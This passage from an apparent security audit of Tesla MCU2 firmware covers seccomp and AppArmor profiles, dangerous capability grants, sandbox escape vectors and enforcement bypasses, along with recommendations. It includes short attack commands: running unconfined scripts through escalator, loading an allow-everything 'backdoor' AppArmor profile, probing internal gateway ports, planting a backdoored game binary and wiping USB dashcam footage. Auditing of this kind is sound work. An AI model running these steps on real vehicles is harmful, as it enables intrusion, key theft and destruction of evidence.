</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox.d/vars/chromium.vars</code></p> <p><strong>Isolation:</strong> - Dedicated network namespace <code>chromium</code> - NAT for internet access - Firewall chain <code>INTERNET</code> controls outbound - No direct host network access</p> <hr> <h3 id=53-kafel-seccomp-filters>5.3 Kafel Seccomp Filters</h3> <p><strong>Example: updater-envoy.kafel</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a>#include &quot;common-defines.kafel&quot;
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>#include &quot;syscall-base.kafel&quot;
<a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a>
<a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a>POLICY updater_envoy {
<a id=__codelineno-21-5 name=__codelineno-21-5 href=#__codelineno-21-5></a>  ALLOW {
<a id=__codelineno-21-6 name=__codelineno-21-6 href=#__codelineno-21-6></a>    ioctl {
<a id=__codelineno-21-7 name=__codelineno-21-7 href=#__codelineno-21-7></a>      cmd == TCGETS          # Terminal get attributes only
<a id=__codelineno-21-8 name=__codelineno-21-8 href=#__codelineno-21-8></a>    }
<a id=__codelineno-21-9 name=__codelineno-21-9 href=#__codelineno-21-9></a>  }
<a id=__codelineno-21-10 name=__codelineno-21-10 href=#__codelineno-21-10></a>}
<a id=__codelineno-21-11 name=__codelineno-21-11 href=#__codelineno-21-11></a>
<a id=__codelineno-21-12 name=__codelineno-21-12 href=#__codelineno-21-12></a>POLICY updater_envoyPolicy {
<a id=__codelineno-21-13 name=__codelineno-21-13 href=#__codelineno-21-13></a>  USE updater_envoy,
<a id=__codelineno-21-14 name=__codelineno-21-14 href=#__codelineno-21-14></a>  USE Base                  # Base syscall whitelist
<a id=__codelineno-21-15 name=__codelineno-21-15 href=#__codelineno-21-15></a>}
<a id=__codelineno-21-16 name=__codelineno-21-16 href=#__codelineno-21-16></a>
<a id=__codelineno-21-17 name=__codelineno-21-17 href=#__codelineno-21-17></a>USE updater_envoyPolicy DEFAULT ERRNO_LOG(13)  # Log denied syscalls
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/kafel/updater-envoy.kafel</code></p> <p><strong>Base Policy (Common Syscalls):</strong> - File operations: <code>open</code>, <code>read</code>, <code>write</code>, <code>close</code>, <code>stat</code> - Memory: <code>mmap</code>, <code>munmap</code>, <code>brk</code> - Process: <code>clone</code>, <code>execve</code>, <code>exit</code> - Network: <code>socket</code>, <code>connect</code>, <code>sendto</code>, <code>recvfrom</code></p> <p><strong>151 Sandbox Profiles Found:</strong> Each service has custom Kafel filters.</p> <hr> <h2 id=6-capability-grants-summary>6. Capability Grants Summary</h2> <h3 id=61-dangerous-capabilities-granted>6.1 Dangerous Capabilities Granted</h3> <table> <thead> <tr> <th>Capability</th> <th>Location</th> <th>Purpose</th> <th>Risk</th> </tr> </thead> <tbody> <tr> <td><code>CAP_SYS_ADMIN</code></td> <td><code>/usr/sbin/nvme</code>, <code>/usr/sbin/lspci</code> profiles</td> <td>NVMe admin, PCI inspection</td> <td>Storage manipulation, hardware enumeration</td> </tr> <tr> <td><code>CAP_NET_ADMIN</code></td> <td><code>/sbin/ip</code> profile</td> <td>Network configuration</td> <td>Firewall bypass, route hijacking</td> </tr> <tr> <td><code>CAP_NET_RAW</code></td> <td><code>/bin/ping</code> profile</td> <td>ICMP packets</td> <td>Network scanning, packet injection</td> </tr> <tr> <td><code>CAP_SYS_PTRACE</code></td> <td><code>/bin/ps</code>, <code>/usr/bin/lsof</code>, <code>/bin/netstat</code></td> <td>Process inspection</td> <td>Memory dumping, credential theft</td> </tr> <tr> <td><code>CAP_SYS_RAWIO</code></td> <td><code>/usr/bin/cpupower</code></td> <td>CPU governor control</td> <td>Power management abuse</td> </tr> <tr> <td><code>CAP_DAC_OVERRIDE</code></td> <td>service-shell, escalator</td> <td>Bypass file permissions</td> <td>Read/write any file</td> </tr> <tr> <td><code>CAP_DAC_READ_SEARCH</code></td> <td>service-shell</td> <td>Bypass read permissions</td> <td>Read any file</td> </tr> <tr> <td><code>CAP_CHOWN</code></td> <td>service-shell</td> <td>Change file ownership</td> <td>Privilege escalation prep</td> </tr> <tr> <td><code>CAP_SETUID</code></td> <td>escalator/exec</td> <td>Change UID/GID</td> <td>User impersonation</td> </tr> <tr> <td><code>CAP_SETGID</code></td> <td>escalator/exec</td> <td>Change GID</td> <td>Group impersonation</td> </tr> </tbody> </table> <p><strong>Citation:</strong> Aggregated from <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/</code></p> <hr> <h3 id=62-capability-grant-breakdown>6.2 Capability Grant Breakdown</h3> <p><strong>Total dangerous capability grants:</strong> 44 instances across profiles</p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a>$<span class=w> </span>grep<span class=w> </span>-r<span class=w> </span><span class=s2>&quot;capability&quot;</span><span class=w> </span>/etc/apparmor.d/abstractions/<span class=w> </span><span class=p>|</span><span class=w> </span><span class=se>\</span>
<a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a><span class=w>  </span>grep<span class=w> </span>-E<span class=w> </span><span class=s2>&quot;sys_admin|net_admin|sys_ptrace|sys_rawio|dac_override&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>wc<span class=w> </span>-l
<a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a><span class=m>44</span>
</code></pre></div> <p><strong>Top 5 Most Dangerous:</strong></p> <ol> <li><strong><code>sys_ptrace</code> (10 grants)</strong> - Memory inspection, process attachment</li> <li><strong><code>dac_override</code> (12 grants)</strong> - Filesystem permission bypass</li> <li><strong><code>net_admin</code> (2 grants)</strong> - Full network control</li> <li><strong><code>sys_admin</code> (3 grants)</strong> - Device/storage admin</li> <li><strong><code>sys_rawio</code> (1 grant)</strong> - Direct I/O access</li> </ol> <hr> <h2 id=7-sandbox-escape-vectors>7. Sandbox Escape Vectors</h2> <h3 id=71-vector-1-service-shell-escalator-unconfined-script>7.1 Vector 1: Service-Shell â†’ Escalator â†’ Unconfined Script</h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Compromise Service-Shell:</strong> Exploit vulnerability in service-mode (port 4035)</li> <li><strong>Execute Escalator:</strong> Call <code>/usr/bin/escalator exec &lt;unconfined_script&gt;</code></li> <li><strong>Run Unconfined:</strong> Execute <code>PUx</code> script like <code>/usr/local/bin/iris-fw-upgrade.sh</code></li> <li><strong>Escape Sandbox:</strong> Unconfined script has no AppArmor restrictions</li> </ol> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=c1># From service-shell context</span>
<a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a>/usr/bin/escalator<span class=w> </span><span class=nb>exec</span><span class=w> </span>/usr/local/bin/iris-fw-upgrade.sh
<a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a><span class=c1># This runs UNCONFINED (PUx)</span>
<a id=__codelineno-23-4 name=__codelineno-23-4 href=#__codelineno-23-4></a><span class=c1># Can now execute arbitrary commands as root</span>
</code></pre></div> <p><strong>Mitigation:</strong> None in current firmware. <code>PUx</code> transitions are by design.</p> <hr> <h3 id=72-vector-2-apparmor-profile-reload>7.2 Vector 2: AppArmor Profile Reload</h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Service-Shell Access:</strong> Compromise service-mode</li> <li><strong>Execute apparmor_parser:</strong> Service-shell can run <code>/sbin/apparmor_parser Ux</code></li> <li><strong>Reload Weakened Profile:</strong> Load modified profile from <code>/etc/apparmor.d/</code></li> <li><strong>Bypass Restrictions:</strong> New profile has fewer restrictions</li> </ol> <p><strong>Requirements:</strong> - Write access to <code>/etc/apparmor.d/</code> (requires <code>dac_override</code> or root) - Knowledge of AppArmor syntax</p> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=c1># From service-shell</span>
<a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a><span class=nb>echo</span><span class=w> </span><span class=s1>&#39;profile /usr/bin/bad_binary { /** rwx, }&#39;</span><span class=w> </span>&gt;<span class=w> </span>/tmp/bad.profile
<a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a>/sbin/apparmor_parser<span class=w> </span>-r<span class=w> </span>/tmp/bad.profile
<a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a><span class=c1># Bad binary now has full filesystem access</span>
</code></pre></div> <p><strong>Mitigation:</strong> <code>/etc/</code> is typically read-only mounted; requires remount rw.</p> <hr> <h3 id=73-vector-3-network-namespace-escape>7.3 Vector 3: Network Namespace Escape</h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Compromise Sandboxed Service:</strong> E.g., chromium process</li> <li><strong>Exploit Veth Configuration:</strong> Sandbox has veth interface with known IP</li> <li><strong>Connect to Host Services:</strong> Host has routes to namespace subnets</li> <li><strong>Port Scan Host:</strong> Discover services on <code>127.0.0.1</code> forwarded via NAT</li> <li><strong>Exploit Host Service:</strong> Attack CAN gateway (port 1500) or updater (20564)</li> </ol> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=c1># From chromium sandbox (192.168.93.142/30)</span>
<a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a><span class=c1># Host is 192.168.93.141</span>
<a id=__codelineno-25-3 name=__codelineno-25-3 href=#__codelineno-25-3></a>curl<span class=w> </span>http://192.168.93.141:1500/<span class=w>  </span><span class=c1># Gateway API</span>
<a id=__codelineno-25-4 name=__codelineno-25-4 href=#__codelineno-25-4></a>curl<span class=w> </span>http://192.168.93.141:20564/<span class=w> </span><span class=c1># Updater API</span>
</code></pre></div> <p><strong>Mitigation:</strong> <code>iptables</code> chains like <code>INTERNET</code> should block internal services, but misconfiguration is possible.</p> <hr> <h3 id=74-vector-4-chroot-escape-via-proc>7.4 Vector 4: Chroot Escape via <code>/proc</code></h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Minijail with <code>/proc</code> Bind:</strong> Many sandboxes bind-mount <code>/proc</code></li> <li><strong>Read Host PIDs:</strong> <code>/proc/1/</code> reveals host init process</li> <li><strong>Exploit Kernel Bug:</strong> Use <code>/proc/*/mem</code> or <code>/proc/*/maps</code> for privilege escalation</li> <li><strong>Escape Chroot:</strong> Write to <code>/proc/sys/</code> or <code>/proc/*/fd/</code> to break out</li> </ol> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=c1># From chroot with /proc mounted</span>
<a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a>ls<span class=w> </span>/proc/1/fd/<span class=w>  </span><span class=c1># List host init&#39;s file descriptors</span>
<a id=__codelineno-26-3 name=__codelineno-26-3 href=#__codelineno-26-3></a><span class=c1># Exploit file descriptor leaks to access host filesystem</span>
</code></pre></div> <p><strong>Mitigation:</strong> AppArmor denies <code>/proc/*/mem</code> access: <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a>audit deny @{PROC}/*/mem rw,
</code></pre></div></p> <hr> <h3 id=75-vector-5-gaming-partition-write>7.5 Vector 5: Gaming Partition Write</h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Service-Shell Access:</strong> Compromise service-mode</li> <li><strong>Use Escalator rwfile:</strong> Write to <code>/opt/games/usr/*</code></li> <li><strong>Install Malicious Game:</strong> Replace game binary with backdoor</li> <li><strong>Wait for User Launch:</strong> User executes malicious game</li> <li><strong>Escalate Privileges:</strong> Game runs with user <code>unreal</code> or <code>godot</code>, exploits to root</li> </ol> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=c1># From service-shell with escalator rwfile</span>
<a id=__codelineno-28-2 name=__codelineno-28-2 href=#__codelineno-28-2></a>/usr/bin/escalator<span class=w> </span>rwfile<span class=w> </span>/opt/games/usr/bin/SomeGame
<a id=__codelineno-28-3 name=__codelineno-28-3 href=#__codelineno-28-3></a><span class=c1># Overwrite game with backdoor</span>
<a id=__codelineno-28-4 name=__codelineno-28-4 href=#__codelineno-28-4></a><span class=c1># User launches game, backdoor runs</span>
</code></pre></div> <p><strong>Mitigation:</strong> Gaming partition is separate, but escalator allows write access.</p> <hr> <h3 id=76-vector-6-usb-format-attack>7.6 Vector 6: USB Format Attack</h3> <p><strong>Attack Path:</strong></p> <ol> <li><strong>Service-Shell Access:</strong> Compromise service-mode</li> <li><strong>Execute format-usb:</strong> Run <code>/usr/bin/format-usb PUx</code> via escalator</li> <li><strong>Format Evidence:</strong> Destroy USB dashcam footage or logs</li> <li><strong>Cover Tracks:</strong> Remove traces of compromise</li> </ol> <p><strong>Example:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a><span class=c1># From service-shell</span>
<a id=__codelineno-29-2 name=__codelineno-29-2 href=#__codelineno-29-2></a>/usr/bin/escalator<span class=w> </span><span class=nb>exec</span><span class=w> </span>/usr/bin/format-usb<span class=w> </span>/dev/sda1
<a id=__codelineno-29-3 name=__codelineno-29-3 href=#__codelineno-29-3></a><span class=c1># Dashcam footage gone</span>
</code></pre></div> <p><strong>Mitigation:</strong> None. <code>format-usb</code> is intentionally unconfined.</p> <hr> <h2 id=8-file-access-boundaries>8. File Access Boundaries</h2> <h3 id=81-read-only-access>8.1 Read-Only Access</h3> <p><strong>Allowed Read-Anywhere:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a>/ r,                                  # Root directory listing
<a id=__codelineno-30-2 name=__codelineno-30-2 href=#__codelineno-30-2></a>/bin/{,**} r,                         # All binaries
<a id=__codelineno-30-3 name=__codelineno-30-3 href=#__codelineno-30-3></a>/etc/{,**} r,                         # All configs
<a id=__codelineno-30-4 name=__codelineno-30-4 href=#__codelineno-30-4></a>/home/{,**/} r,                       # Home directories (traversal)
<a id=__codelineno-30-5 name=__codelineno-30-5 href=#__codelineno-30-5></a>@{PROC}/{,**} r,                      # Full /proc access
<a id=__codelineno-30-6 name=__codelineno-30-6 href=#__codelineno-30-6></a>/sys/{,**} r,                         # Full /sys access
<a id=__codelineno-30-7 name=__codelineno-30-7 href=#__codelineno-30-7></a>/var/{,**/} r,                        # Var (with exceptions)
</code></pre></div> <p><strong>Exceptions (Blocked Reads):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-31-1 name=__codelineno-31-1 href=#__codelineno-31-1></a>audit deny /opt/games/var/** r,       # Gaming save data
<a id=__codelineno-31-2 name=__codelineno-31-2 href=#__codelineno-31-2></a>audit deny /opt/tesla/var/** r,       # Tesla private data
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-allowed-files</code> [Lines 2-38]</p> <hr> <h3 id=82-write-access>8.2 Write Access</h3> <p><strong>Allowed Write Locations:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-32-1 name=__codelineno-32-1 href=#__codelineno-32-1></a># Service-shell workspace
<a id=__codelineno-32-2 name=__codelineno-32-2 href=#__codelineno-32-2></a>/var/run/service-shell/{,**} rw,
<a id=__codelineno-32-3 name=__codelineno-32-3 href=#__codelineno-32-3></a>/run/service-shell/{,**} rw,
<a id=__codelineno-32-4 name=__codelineno-32-4 href=#__codelineno-32-4></a>
<a id=__codelineno-32-5 name=__codelineno-32-5 href=#__codelineno-32-5></a># Scratch directory
<a id=__codelineno-32-6 name=__codelineno-32-6 href=#__codelineno-32-6></a>/ss/{,**} rw,                         # Unrestricted temp space
<a id=__codelineno-32-7 name=__codelineno-32-7 href=#__codelineno-32-7></a>
<a id=__codelineno-32-8 name=__codelineno-32-8 href=#__codelineno-32-8></a># Via escalator rwfile
<a id=__codelineno-32-9 name=__codelineno-32-9 href=#__codelineno-32-9></a>/opt/games/usr/* w,                   # Gaming partition
<a id=__codelineno-32-10 name=__codelineno-32-10 href=#__codelineno-32-10></a>/home/godot/.Tesla/data/AssetGen/{,**} rw,
<a id=__codelineno-32-11 name=__codelineno-32-11 href=#__codelineno-32-11></a>/home/unreal/.Tesla/data/AssetGen/{,**} rw,
<a id=__codelineno-32-12 name=__codelineno-32-12 href=#__codelineno-32-12></a>
<a id=__codelineno-32-13 name=__codelineno-32-13 href=#__codelineno-32-13></a># Via bin/rm profile
<a id=__codelineno-32-14 name=__codelineno-32-14 href=#__codelineno-32-14></a>/home/*-updater/{,**} w,              # Updater directories
<a id=__codelineno-32-15 name=__codelineno-32-15 href=#__codelineno-32-15></a>/var/spool/*-updater/{,**} rw,        # Update queue
<a id=__codelineno-32-16 name=__codelineno-32-16 href=#__codelineno-32-16></a>/tmp/media_cache/{,**} rw,
<a id=__codelineno-32-17 name=__codelineno-32-17 href=#__codelineno-32-17></a>/tmp/streamcache/{,**} rw,
</code></pre></div> <p><strong>Citation:</strong> Aggregated from service-shell profiles</p> <hr> <h3 id=83-credential-access>8.3 Credential Access</h3> <p><strong>Read-Only Credentials:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-33-1 name=__codelineno-33-1 href=#__codelineno-33-1></a>/var/lib/*_creds/*.crt r,             # Certificates (public)
<a id=__codelineno-33-2 name=__codelineno-33-2 href=#__codelineno-33-2></a>/var/lib/*_creds/*.key r,             # Private keys (read-only!)
<a id=__codelineno-33-3 name=__codelineno-33-3 href=#__codelineno-33-3></a>/usr/share/tesla-certificates/{,**} r,
</code></pre></div> <p><strong>Write-Blocked:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-34-1 name=__codelineno-34-1 href=#__codelineno-34-1></a>audit deny /var/lib/*_creds/*.key rw,  # Cannot overwrite keys
<a id=__codelineno-34-2 name=__codelineno-34-2 href=#__codelineno-34-2></a>audit deny /var/etc/ssh/ssh_host_*_key rw,
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell</code> [Line 21-22]<br> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-blocked-files</code> [Line 5]</p> <p><strong>ðŸš¨ FINDING:</strong> Service-shell can <strong>read private keys</strong> but cannot modify them. Keys can be exfiltrated via Hermes upload or service-mode.</p> <hr> <h2 id=9-profile-loading-enforcement-bypass>9. Profile Loading &amp; Enforcement Bypass</h2> <h3 id=91-apparmor-profile-loading>9.1 AppArmor Profile Loading</h3> <p><strong>Loader Binary:</strong> <code>/sbin/apparmor_parser</code></p> <p><strong>Service-Shell Access:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-35-1 name=__codelineno-35-1 href=#__codelineno-35-1></a>/sbin/apparmor_parser Ux,            # Unconfined execution!
<a id=__codelineno-35-2 name=__codelineno-35-2 href=#__codelineno-35-2></a>/etc/apparmor.compiled/usr.bin.service-shell-* r,
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell</code> [Line 34-35]</p> <p><strong>Profile Compilation:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-36-1 name=__codelineno-36-1 href=#__codelineno-36-1></a><span class=c1># Profiles stored in two formats</span>
<a id=__codelineno-36-2 name=__codelineno-36-2 href=#__codelineno-36-2></a>/etc/apparmor.d/abstractions/&lt;profile&gt;<span class=w>         </span><span class=c1># Source (text)</span>
<a id=__codelineno-36-3 name=__codelineno-36-3 href=#__codelineno-36-3></a>/etc/apparmor.compiled/&lt;binary_path&gt;<span class=w>           </span><span class=c1># Compiled (binary cache)</span>
</code></pre></div> <p><strong>At Boot:</strong> 1. Kernel loads compiled profiles from <code>/etc/apparmor.compiled/</code> 2. Binary transitions trigger profile enforcement</p> <hr> <h3 id=92-enforcement-bypass-method-1-profile-replacement>9.2 Enforcement Bypass Method 1: Profile Replacement</h3> <p><strong>Attack:</strong></p> <ol> <li><strong>Gain Write Access:</strong> Exploit to get <code>/etc/</code> write permissions</li> <li><strong>Create Permissive Profile:</strong> Write profile that allows everything</li> <li><strong>Reload Profile:</strong> Execute <code>/sbin/apparmor_parser -r /etc/apparmor.d/my_profile</code></li> <li><strong>Execute Binary:</strong> Launch binary now covered by permissive profile</li> </ol> <p><strong>Requirements:</strong> - Root or <code>CAP_DAC_OVERRIDE</code> - <code>/etc/</code> mounted read-write (default is ro)</p> <p><strong>Example Profile:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-37-1 name=__codelineno-37-1 href=#__codelineno-37-1></a>profile /usr/bin/backdoor {
<a id=__codelineno-37-2 name=__codelineno-37-2 href=#__codelineno-37-2></a>  /** rwx,                            # Read/write/execute anywhere
<a id=__codelineno-37-3 name=__codelineno-37-3 href=#__codelineno-37-3></a>  capability,                          # All capabilities
<a id=__codelineno-37-4 name=__codelineno-37-4 href=#__codelineno-37-4></a>  network,                             # All network access
<a id=__codelineno-37-5 name=__codelineno-37-5 href=#__codelineno-37-5></a>  ptrace,                              # Process tracing
<a id=__codelineno-37-6 name=__codelineno-37-6 href=#__codelineno-37-6></a>}
</code></pre></div> <hr> <h3 id=93-enforcement-bypass-method-2-unconfined-transitions>9.3 Enforcement Bypass Method 2: Unconfined Transitions</h3> <p><strong>Current Design:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-38-1 name=__codelineno-38-1 href=#__codelineno-38-1></a># From service-shell
<a id=__codelineno-38-2 name=__codelineno-38-2 href=#__codelineno-38-2></a>/sbin/runit-init Ux,                 # Unconfined
<a id=__codelineno-38-3 name=__codelineno-38-3 href=#__codelineno-38-3></a>/sbin/apparmor_parser Ux,            # Unconfined
<a id=__codelineno-38-4 name=__codelineno-38-4 href=#__codelineno-38-4></a>
<a id=__codelineno-38-5 name=__codelineno-38-5 href=#__codelineno-38-5></a># From escalator
<a id=__codelineno-38-6 name=__codelineno-38-6 href=#__codelineno-38-6></a>/usr/local/bin/iris-fw-upgrade.sh PUx,  # Profile-unconfined
<a id=__codelineno-38-7 name=__codelineno-38-7 href=#__codelineno-38-7></a>/bin/pkill PUx,
<a id=__codelineno-38-8 name=__codelineno-38-8 href=#__codelineno-38-8></a>/sbin/reboot PUx,
<a id=__codelineno-38-9 name=__codelineno-38-9 href=#__codelineno-38-9></a># ... 60+ more unconfined scripts
</code></pre></div> <p><strong>Attack:</strong> - No exploit needed, <strong>this is intentional</strong> - Service-shell can execute unconfined scripts by design - Escalator provides controlled access to unconfined operations</p> <p><strong>Mitigation:</strong> Tesla relies on <strong>service-mode authentication</strong> (HMAC + VIN + DIN) to prevent unauthorized access. If this is bypassed, sandbox is fully compromised.</p> <hr> <h3 id=94-enforcement-bypass-method-3-profile-stacking-bug>9.4 Enforcement Bypass Method 3: Profile Stacking Bug</h3> <p><strong>Theoretical Attack:</strong></p> <p>If AppArmor profile stacking has bugs (CVE history exists), attacker could: 1. Create nested profiles with conflicting rules 2. Trigger kernel confusion about active profile 3. Execute code without any profile enforcement</p> <p><strong>Status:</strong> No known exploits for Tesla's kernel version (5.4.255), but profile stacking complexity increases attack surface.</p> <hr> <h3 id=95-enforcement-status-check>9.5 Enforcement Status Check</h3> <p><strong>Runtime Check:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-39-1 name=__codelineno-39-1 href=#__codelineno-39-1></a><span class=c1># Check if profile is loaded</span>
<a id=__codelineno-39-2 name=__codelineno-39-2 href=#__codelineno-39-2></a>$<span class=w> </span>grep<span class=w> </span>-F<span class=w> </span><span class=s2>&quot;/usr/bin/my_binary&quot;</span><span class=w> </span>/sys/kernel/security/apparmor/profiles
<a id=__codelineno-39-3 name=__codelineno-39-3 href=#__codelineno-39-3></a>
<a id=__codelineno-39-4 name=__codelineno-39-4 href=#__codelineno-39-4></a><span class=c1># Check enforcement mode</span>
<a id=__codelineno-39-5 name=__codelineno-39-5 href=#__codelineno-39-5></a>$<span class=w> </span>cat<span class=w> </span>/sys/module/apparmor/parameters/enabled
<a id=__codelineno-39-6 name=__codelineno-39-6 href=#__codelineno-39-6></a>Y
<a id=__codelineno-39-7 name=__codelineno-39-7 href=#__codelineno-39-7></a>
<a id=__codelineno-39-8 name=__codelineno-39-8 href=#__codelineno-39-8></a><span class=c1># Check for complain mode (logs but doesn&#39;t enforce)</span>
<a id=__codelineno-39-9 name=__codelineno-39-9 href=#__codelineno-39-9></a>$<span class=w> </span>aa-status<span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span>complain
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 349-351]</p> <p><strong>Sandbox.bash Behavior:</strong> - Logs warning if no profile found - <strong>Does NOT block execution</strong> - Process runs with whatever profile kernel assigns (may be none!)</p> <hr> <h2 id=10-overly-permissive-profiles>10. Overly Permissive Profiles</h2> <h3 id=101-service-shell-base-profile>10.1 Service-Shell Base Profile</h3> <p><strong>Risk Level:</strong> ðŸ”´ HIGH</p> <p><strong>Permissive Rules:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-40-1 name=__codelineno-40-1 href=#__codelineno-40-1></a>/sbin/runit-init Ux,                 # Can restart init system unconfined
<a id=__codelineno-40-2 name=__codelineno-40-2 href=#__codelineno-40-2></a>/sbin/apparmor_parser Ux,            # Can reload AppArmor profiles
<a id=__codelineno-40-3 name=__codelineno-40-3 href=#__codelineno-40-3></a>capability dac_override,              # Bypass all file permissions
<a id=__codelineno-40-4 name=__codelineno-40-4 href=#__codelineno-40-4></a>capability dac_read_search,           # Read any file
</code></pre></div> <p><strong>Why Overly Permissive:</strong> - Service-shell is designed for <strong>factory/service technicians</strong> - Grants near-root access for diagnostics - Relies entirely on <strong>authentication at entry point</strong> (port 4035 HMAC)</p> <p><strong>Recommendation:</strong> Split into two profiles: - <code>service-shell-readonly</code> - Diagnostics only (no <code>dac_override</code>) - <code>service-shell-admin</code> - Full access (requires additional auth factor)</p> <hr> <h3 id=102-escalator-exec-profile>10.2 Escalator Exec Profile</h3> <p><strong>Risk Level:</strong> ðŸ”´ CRITICAL</p> <p><strong>Permissive Rules:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-41-1 name=__codelineno-41-1 href=#__codelineno-41-1></a># 60+ unconfined transitions
<a id=__codelineno-41-2 name=__codelineno-41-2 href=#__codelineno-41-2></a>/sbin/reboot PUx,
<a id=__codelineno-41-3 name=__codelineno-41-3 href=#__codelineno-41-3></a>/usr/local/bin/iris-fw-upgrade.sh PUx,
<a id=__codelineno-41-4 name=__codelineno-41-4 href=#__codelineno-41-4></a>/usr/bin/odin-trigger-trampoline PUx,
<a id=__codelineno-41-5 name=__codelineno-41-5 href=#__codelineno-41-5></a>/opt/hermes/hermes_fileupload PUx,
<a id=__codelineno-41-6 name=__codelineno-41-6 href=#__codelineno-41-6></a># ... etc
</code></pre></div> <p><strong>Why Overly Permissive:</strong> - Escalator provides controlled access to root operations - Each <code>PUx</code> script runs <strong>without AppArmor restrictions</strong> - Single compromise of escalator = full system access</p> <p><strong>Recommendation:</strong> - Confine each script with dedicated profile (<code>Px</code> instead of <code>PUx</code>) - Example: <code>/usr/local/bin/iris-fw-upgrade.sh Px</code> with profile restricting to <code>/dev/iris*</code></p> <hr> <h3 id=103-binrm-profile>10.3 Bin/Rm Profile</h3> <p><strong>Risk Level:</strong> ðŸŸ¡ MEDIUM</p> <p><strong>Permissive Rules:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-42-1 name=__codelineno-42-1 href=#__codelineno-42-1></a>/home/*-updater/{,**} w,             # Delete updater files
<a id=__codelineno-42-2 name=__codelineno-42-2 href=#__codelineno-42-2></a>/var/spool/*-updater/{,**} rw,       # Corrupt update queue
<a id=__codelineno-42-3 name=__codelineno-42-3 href=#__codelineno-42-3></a>/opt/games/usr/** rw,                # Delete games
<a id=__codelineno-42-4 name=__codelineno-42-4 href=#__codelineno-42-4></a>capability dac_override,              # Bypass permissions
<a id=__codelineno-42-5 name=__codelineno-42-5 href=#__codelineno-42-5></a>capability fowner,                    # Override file ownership checks
</code></pre></div> <p><strong>Why Overly Permissive:</strong> - Allows deletion of critical updater spool files - Could corrupt in-progress OTA updates - Gaming partition deletion disrupts user experience</p> <p><strong>Recommendation:</strong> - Restrict to specific temp directories only - Example: <code>/tmp/{,**} w</code> instead of <code>/home/*-updater/{,**} w</code></p> <hr> <h3 id=104-ip-command-profile>10.4 IP Command Profile</h3> <p><strong>Risk Level:</strong> ðŸ”´ HIGH</p> <p><strong>Permissive Rules:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-43-1 name=__codelineno-43-1 href=#__codelineno-43-1></a>capability net_admin,                 # Full network administration
<a id=__codelineno-43-2 name=__codelineno-43-2 href=#__codelineno-43-2></a>network netlink raw,                  # Direct kernel netlink
